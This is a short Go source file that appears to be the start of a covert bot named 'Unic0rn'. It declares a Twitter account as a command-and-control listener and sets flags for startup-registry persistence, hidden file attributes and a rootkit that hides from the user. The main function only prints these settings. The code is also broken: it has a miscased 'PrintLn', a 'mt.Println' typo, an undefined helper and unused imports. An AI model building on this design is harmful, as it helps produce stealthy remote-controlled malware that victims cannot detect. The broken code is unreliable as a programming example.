package main

import (
	// Native Packs
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
	"os"

)
var (
	commander string = "GolangAT"		// Twitter listener 
	slumber time.Duration = 5			// Time between commands
	cmd string = ""						// stores latest command


	enable_install bool = true		// add to startup registry
	enable_stealth bool = true		// hide system attributes to its files 
	enable_rootkit bool = true		// hide from user
)

func main() {
	fmt.PrintLn("Unic0rn loaded")
	mt.Println("SETTINGS")
	fmt.Println("Location:\t\t", os.Args[0])
	fmt.Println("Commander:\t\t", commander)
	fmt.Println("Refresh interval:\t", int(slumber))
	fmt.Println("Install:\t\t", isTrue(enable_install))
	fmt.Println("Stealth:\t\t", isTrue(enable_stealth))
	fmt.Println("Rootkit:\t\t", isTrue(enable_rootkit), "\n")

}